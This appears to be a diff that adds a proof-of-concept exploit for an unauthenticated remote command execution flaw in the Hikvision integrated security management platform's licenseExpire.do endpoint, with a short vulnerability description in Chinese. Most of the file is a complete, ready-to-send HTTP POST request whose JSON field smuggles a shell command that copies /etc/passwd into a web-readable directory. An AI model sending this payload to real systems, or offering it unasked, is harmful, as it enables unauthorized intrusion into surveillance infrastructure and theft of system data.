@@ -1,0 +1,12 @@
+# HIKVISION综合安防管理平台licenseExpire前台远程命令执行漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 综合安防管理平台/portal/cas/login/ajax/licenseExpire.do 存在远程命令执行漏洞，未经身份验证的攻击者可通过该漏洞在目标服务器执行任意代码。
+POST /portal/cas/login/ajax/licenseExpire.do?acid=80051733&bid=hd_tag_m8mv264w HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv264w
+RM-PRO-Token: 861c8f674ab0bfcc2c237410fe3adf83
+RM-PRO-Time: 1742808546645
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+id={"type":"environment","operate":"","machines":{"id":"$(cat /etc/passwd > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/1.txt)"}
